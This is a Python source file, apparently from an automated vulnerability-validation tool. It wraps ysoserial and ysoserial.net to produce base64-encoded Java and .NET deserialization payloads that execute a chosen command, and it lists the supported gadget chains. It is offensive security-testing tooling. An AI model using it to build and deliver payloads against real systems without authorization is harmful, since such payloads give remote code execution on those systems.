"""
ysoserial wrapper — Java deserialization gadget chain generator.

Generates a serialized-Java payload using one of ~30 known gadget chains.
The validator uses this when it has a deserialization sink + classpath
evidence pointing to a vulnerable library version.

Two modes:
  Java:  ysoserial.jar  (JVM-only; install via maven or release page)
  .NET:  ysoserial.net  (mono required on Linux)

The wrapper auto-discovers the binary path via $YSOSERIAL_JAR /
$YSOSERIAL_NET env vars and falls back to /opt/ysoserial.jar.
"""
from __future__ import annotations

import base64
import os
import subprocess
from pathlib import Path


YSOSERIAL_JAR_DEFAULT = os.environ.get(
    "YSOSERIAL_JAR", "/opt/ysoserial-all.jar",
)
YSOSERIAL_NET_DEFAULT = os.environ.get(
    "YSOSERIAL_NET", "/opt/ysoserial.net/ysoserial.exe",
)

JAVA_GADGETS = [
    "CommonsCollections1", "CommonsCollections2", "CommonsCollections3",
    "CommonsCollections4", "CommonsCollections5", "CommonsCollections6",
    "CommonsCollections7",
    "CommonsBeanutils1",
    "Spring1", "Spring2",
    "Groovy1",
    "Hibernate1", "Hibernate2",
    "JBossInterceptors1",
    "JRMPClient", "JRMPListener",
    "Jdk7u21",
    "Mozilla", "MozillaRhino1", "MozillaRhino2",
    "MyfacesRO1", "MyfacesPayload1",
    "ROME",
    "Vaadin1",
    "URLDNS",
    "Wicket1",
]

DOTNET_GADGETS = [
    "TextFormattingRunProperties", "PSObject", "ObjectDataProvider",
    "WindowsClaimsIdentity", "WindowsIdentity", "WindowsPrincipal",
    "TypeConfuseDelegate", "DataSet",
    "SessionSecurityToken", "RolePrincipal",
    "ClaimsPrincipal",
]


def generate_ysoserial_payload(
    runtime: str,           # "java" or "dotnet"
    gadget: str,
    command: str,
    output_format: str = "base64",
    timeout: int = 60,
) -> dict:
    """Generate a serialized payload.

    runtime="java": uses ysoserial.jar
    runtime="dotnet": uses ysoserial.net
    """
    if runtime == "java":
        if gadget not in JAVA_GADGETS:
            return {"error": f"unknown Java gadget: {gadget}",
                     "known": JAVA_GADGETS}
        jar = YSOSERIAL_JAR_DEFAULT
        if not Path(jar).exists():
            return {"error": f"ysoserial.jar not found at {jar}; set $YSOSERIAL_JAR"}
        cmd = ["java", "-jar", jar, gadget, command]
    elif runtime == "dotnet":
        if gadget not in DOTNET_GADGETS:
            return {"error": f"unknown .NET gadget: {gadget}",
                     "known": DOTNET_GADGETS}
        exe = YSOSERIAL_NET_DEFAULT
        if not Path(exe).exists():
            return {"error": f"ysoserial.net not found at {exe}; set $YSOSERIAL_NET"}
        # Use mono on non-Windows
        if os.name != "nt":
            cmd = ["mono", exe, "-g", gadget, "-c", command,
                   "-f", "BinaryFormatter", "-o", "base64"]
        else:
            cmd = [exe, "-g", gadget, "-c", command,
                   "-f", "BinaryFormatter", "-o", "base64"]
    else:
        return {"error": f"unknown runtime: {runtime} (java | dotnet)"}

    try:
        proc = subprocess.run(
            cmd, capture_output=True, timeout=timeout,
        )
    except subprocess.TimeoutExpired:
        return {"error": "ysoserial timeout"}
    except FileNotFoundError as e:
        return {"error": f"binary not found: {e}"}

    if proc.returncode != 0:
        return {"error": "ysoserial failed",
                 "stderr": proc.stderr.decode(errors="replace")[:500]}
    raw = proc.stdout
    if runtime == "dotnet":
        # ysoserial.net outputs base64 directly
        payload_b64 = raw.decode(errors="replace").strip()
    else:
        # Java: raw bytes; base64-encode for transport
        if output_format == "base64":
            payload_b64 = base64.b64encode(raw).decode()
        else:
            payload_b64 = raw.hex()
    return {
        "summary": f"generated {runtime} {gadget} payload ({len(payload_b64)} chars b64)",
        "runtime": runtime,
        "gadget": gadget,
        "command": command,
        "payload_b64": payload_b64,
        "size_bytes_raw": len(raw),
    }
